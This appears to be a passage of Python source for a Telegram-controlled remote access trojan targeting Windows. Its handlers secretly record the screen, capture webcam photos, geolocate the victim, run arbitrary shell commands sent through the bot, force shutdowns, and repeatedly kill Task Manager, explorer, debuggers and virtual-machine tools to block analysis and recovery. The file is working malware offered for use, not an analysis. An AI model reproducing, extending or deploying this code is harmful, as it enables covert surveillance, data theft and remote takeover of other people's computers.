
    while True:

        screenshot = pyautogui.screenshot()


        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        output_video.write(frame)

        if time.time() - start_time > int(message.text):
            break

    output_video.release()
    cv2.destroyAllWindows()

    try:    
        with open('498j-33v1-9d24-z390.mkv' , 'rb') as screenvideo:
            bot.send_document(message.chat.id , screenvideo , timeout=122)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')
    os.remove('498j-33v1-9d24-z390.mkv')


#################################################################################
@bot.message_handler(commands=['info'])
def information(message):
# about location
    try:
        
        result = os.popen('curl ipinfo.io/ip').read().strip()
        bot.send_message(message.chat.id,f"Ip:\n {result}")
        
        ###########################################################
        
        result = os.popen('curl ipinfo.io/city').read().strip()
        bot.send_message(message.chat.id,f"City:\n {result}")
        
        ###########################################################
        
        
        result = os.popen('curl ipinfo.io/region').read().strip()
        bot.send_message(message.chat.id,f"Region:\n {result}")
            
        ###########################################################
        
        result = os.popen('curl ipinfo.io/country').read().strip()
        bot.send_message(message.chat.id,f"Country:\n {result}")
                
        ###########################################################
        
        result = os.popen('curl ipinfo.io/loc').read().strip()
        bot.send_message(message.chat.id,f"Location:\n {result}")
        
        ###########################################################
        
        result = os.popen('curl ipinfo.io/org').read().strip()
        bot.send_message(message.chat.id,f"Provider:\n {result}")
            
        ###########################################################
        
        result = os.popen('curl ipinfo.io/postal').read().strip()
        bot.send_message(message.chat.id,f"Postal:\n {result}")
                
        ###########################################################
        
        result = os.popen('curl ipinfo.io/timezone').read().strip()
        bot.send_message(message.chat.id,f"Timezone:\n {result}")
##################################################################################
# about pc        
        result = os.popen('wmic os get /format:list').read().strip()
        bot.send_message(message.chat.id,'########################################')
        bot.send_message(message.chat.id,f"Result:\n {result}")
    
    except Exception as e:
        bot.send_message(message.chat.id, f"Error:{e}")
#################################################################################

@bot.message_handler(commands=['winblocker'])
def winblocker(message):
    bot.send_message(message.chat.id ,'Windows is blocked!')

    while True:
        c = os.popen('wmic process get description').read().strip()

        blacklisted_processes = [
                'perfmon.exe', 
                'Taskmgr.exe',
                'ProcessHacker.exe',
                'cmd.exe',
                'explorer.exe' ,
                'vmwareuser.exe',
                'fakenet.exe', 
                'dumpcap.exe', 
                'httpdebuggerui.exe', 
                'wireshark.exe', 
                'fiddler.exe', 
                'vboxservice.exe', 
                'df5serv.exe', 
                'vboxtray.exe', 
                'vmwaretray.exe', 
                'ida64.exe', 
                'ollydbg.exe', 
                'pestudio.exe', 
                'vgauthservice.exe', 
                'vmacthlp.exe', 
                'x96dbg.exe', 
                'x32dbg.exe', 
                'prl_cc.exe', 
                'prl_tools.exe', 
                'xenservice.exe', 
                'qemu-ga.exe', 
                'joeboxcontrol.exe', 
                'ksdumperclient.exe', 
                'ksdumper.exe', 
                'joeboxserver.exe', 
            ]

        for badproc in blacklisted_processes:
                
            if badproc in c:
                if badproc == 'cmd.exe':
                    pass
                else:
                    bot.send_message(message.chat.id ,f'{badproc} is killed!')
                os.popen(f'taskkill /f /im {badproc}')


#################################################################################

@bot.message_handler(commands=['winblocker2'])
def winblocker(message):
    bot.send_message(message.chat.id ,'Windows is blocked!')

    while True:
        c = os.popen('tasklist').read().strip()

        blacklisted_processes = [
                'perfmon.exe', 
                'Taskmgr.exe',
                'ProcessHacker.exe',
                'cmd.exe',
                'explorer.exe' ,
                'vmwareuser.exe',
                'fakenet.exe', 
                'dumpcap.exe', 
                'httpdebuggerui.exe', 
                'wireshark.exe', 
                'fiddler.exe', 
                'vboxservice.exe', 
                'df5serv.exe', 
                'vboxtray.exe', 
                'vmwaretray.exe', 
                'ida64.exe', 
                'ollydbg.exe', 
                'pestudio.exe', 
                'vgauthservice.exe', 
                'vmacthlp.exe', 
                'x96dbg.exe', 
                'x32dbg.exe', 
                'prl_cc.exe', 
                'prl_tools.exe', 
                'xenservice.exe', 
                'qemu-ga.exe', 
                'joeboxcontrol.exe', 
                'ksdumperclient.exe', 
                'ksdumper.exe', 
                'joeboxserver.exe', 
            ]

        for badproc in blacklisted_processes:
                
            if badproc in c:
                if badproc == 'cmd.exe':
                    pass
                else:
                    bot.send_message(message.chat.id ,f'{badproc} is killed!')
                os.popen(f'taskkill /f /im {badproc}')


###################################################################

@bot.message_handler(commands=['playsound'])
def plsound(message):
    try:
    
        muspath = message.text.split('/playsound', 1)[1].strip()

        os.popen(f'start {muspath}')
    
        bot.send_message(message.chat.id, 'Music started playing in pc succesfuly')

    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')    

###################################################################
@bot.message_handler(commands=['chrome'])
def opensite(message):
    try:
        site = message.text.split('/chrome', 1)[1].strip()
        os.popen(f'start chrome "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} has opened succesfuly')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        
#################################################################################


@bot.message_handler(commands=['edge'])
def opensite(message):
    try:
        site = message.text.split('/edge', 1)[1].strip()
        os.popen(f'start msedge "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} has opened succesfuly')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        
#################################################################################


@bot.message_handler(commands=['firefox'])
def opensite(message):
    try:
        site = message.text.split('/firefox', 1)[1].strip()
        os.popen(f'start firefox "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} has opened succesfuly')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        

#################################################################################
@bot.message_handler(commands=['webscreen'])
def take_photo(message):
    try:
        
        cap = cv2.VideoCapture(0)

        
        ret, frame = cap.read()

        
        photo_path = 'photo.jpg'
        cv2.imwrite(photo_path, frame)

        
        with open(photo_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        
        os.remove(photo_path)

        
        cap.release()

    except Exception as e:
        bot.send_message(message.chat.id, f"Error capturing photo: {e}")
#################################################################################

@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    try:
        
        screenshot_path = 'screenshot.png'
        pyautogui.screenshot(screenshot_path)

        
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        
        os.remove(screenshot_path)

    except Exception as e:
        bot.send_message(message.chat.id, f"Error :(: {e}")

current_directory = os.getcwd()

#################################################################################

@bot.message_handler(commands=['sleep'])
def slip(message):
    try:
        ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
        bot.send_message(message.chat.id, 'Pc is sendend to sleep!') 
    except Exception as e:
        bot.send_message(message.chat.id, f"Error :(: {e}")


#################################################################################


@bot.message_handler(commands=['cd'])
def change_directory_command(message):
    try:
        global current_directory 
        new_directory = message.text.split('/cd', 1)[1].strip()
        
        
        os.chdir(new_directory)
        current_directory = os.getcwd()
        
        bot.send_message(message.chat.id, f"You are in this directory:\n{current_directory}")
    except Exception as e:
        bot.send_message(message.chat.id, f"This directory does not exists: {e}")


#################################################################################



@bot.message_handler(commands=['whoami'])
def whoami_command(message):
    
    result = os.popen('whoami').read().strip()

    
    bot.send_message(message.chat.id, f'result: {result}')
 
 
 
#################################################################################
    
execute_enabled = False  

def execute_command(command):
    global execute_enabled

    try:
        if command.lower() == 'exit':
            execute_enabled = False
            return "Exit"

        elif command.lower() == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            return f"You are in: {parent_directory}"

        elif command.lower().startswith('cd '):
            directory = command.lower().split(' ', 1)[1].strip()
            os.chdir(directory)
            return f"You are in: {directory}"

        else:
            result = os.popen(command.lower()).read()
            return f"Result:\n\n{result}"

    except Exception as e:
        return f"Error:\n\n{e}"

@bot.message_handler(commands=['execute'])
def handle_execute(message):
    global execute_enabled
    execute_enabled = True
    bot.send_message(message.chat.id, "Enter  your command(enter \"exit\", if you want to exit):")

@bot.message_handler(func=lambda message: execute_enabled)
def handle_command(message):
    command_result = execute_command(message.text)
    bot.send_message(message.chat.id, command_result)

############################################################################
#old execute with bugs
'''@bot.message_handler(commands=['execute'])
def handle_execute(message):
    bot.send_message(message.chat.id, "enter command for execution (enter 'exit' if you want to exit):")

@bot.message_handler(func=lambda message: True)
def handle_command(message):
    try:
        if message.text.lower() == 'exit':
            bot.send_message(message.chat.id, "Exit")
            
        elif message.text.lower() == 'cd..':
                current_directory = os.getcwd()
                parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
                os.chdir(parent_directory)
                bot.send_message(message.chat.id, f"You are in: {parent_directory}")
        elif message.text.lower().startswith('cd '):
                directory = message.text.lower().split(' ', 1)[1].strip()
                os.chdir(directory)
                bot.send_message(message.chat.id, f"You are in: {directory}")
        else:
                res = os.popen(message.text.lower()).read()
                bot.send_message(message.chat.id, f"Result:\n\n{res}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
    '''
    
    
##################################################################
    

@bot.message_handler(commands=['shellexecute'])

def command_execution(message):
    
    command = message.text.split('/shellexecute', 1)[1].strip()
    res = os.popen(command).read()
    
    bot.send_message(message.chat.id, f"Result of command:\n\n{res}")
    
@bot.message_handler(commands=['e'])

def command_execution(message):
    try:
        command = message.text.split('/e', 1)[1].strip()
        if command == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            bot.send_message(message.chat.id, f"You are in: {parent_directory}")
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"You are in: {directory}")
        else:
            res = os.popen(command).read()
            bot.send_message(message.chat.id, f"Result:\n\n{res}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
    
#################################################################################
    
    
MAX_MESSAGE_LENGTH = 4096

@bot.message_handler(commands=['ex'])
def command_execution(message):
    try:
        command = message.text.split('/ex', 1)[1].strip()
        
        if command == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            bot.send_message(message.chat.id, f"You are in: {parent_directory}")
            
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"You are in: {os.getcwd()}")
            
        else:
            res = os.popen(command).read()
            
            
            res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
            if len(res_chunks) > 1:
                
                with open('_windows_.txt', 'w', encoding='utf-8') as file:
                    file.write(res)
                    os.popen( "attrib +h r.txt" )
                with open('_windows_.txt', 'rb') as document:
                    bot.send_document(message.chat.id, document)
                os.remove('_windows_.txt')
            else:
                
                for res_chunk in res_chunks:
                    bot.send_message(message.chat.id, f"Result:\n\n{res_chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
#################################################################################
@bot.message_handler(commands=['shutdown'])
def command_execution(message):
    
    try:
        
        os.popen('shutdown /s /f /t 0')
        
        bot.send_message(message.chat.id, "pc is shutdowned!")
    except Exception as e:
       
        bot.send_message(message.chat.id, f'Error:{e}')


#################################################################################


@bot.message_handler(commands=['restart'])
def command_execution(message):
    
    try:
        
        os.popen('shutdown /r /f /t 0')

        bot.send_message(message.chat.id, "pc is restarted!")
    except Exception as e:
       
        bot.send_message(message.chat.id, f'Error:{e}')
        
        
#################################################################################

@bot.message_handler(commands=['tasklist'])
def command_execution(message):
    try:
        command = 'tasklist'
        

        res = os.popen(command).read()
            
            
        res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
        if len(res_chunks) > 1:
                
            with open('_windows_.txt', 'w', encoding='utf-8') as file:
                file.write(res)
                os.popen( "attrib +h r.txt" )
            with open('_windows_.txt', 'rb') as document:
                bot.send_document(message.chat.id, document)
            os.remove('_windows_.txt')
        
        res = os.popen('wmic process get description').read().strip()
        res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
        if len(res_chunks) > 1:
                
            with open('_windows2_.txt', 'w', encoding='utf-8') as file:
                file.write(res)
                os.popen( "attrib +h r.txt" )
            with open('_windows2_.txt', 'rb') as document:
                bot.send_document(message.chat.id, document)
            os.remove('_windows2_.txt')        
        
        else:
                
            for res_chunk in res_chunks:
                bot.send_message(message.chat.id, f"Result:\n\n{res_chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")

if __name__ == "__main__":

    bot.polling(none_stop=True)


#################################################################################
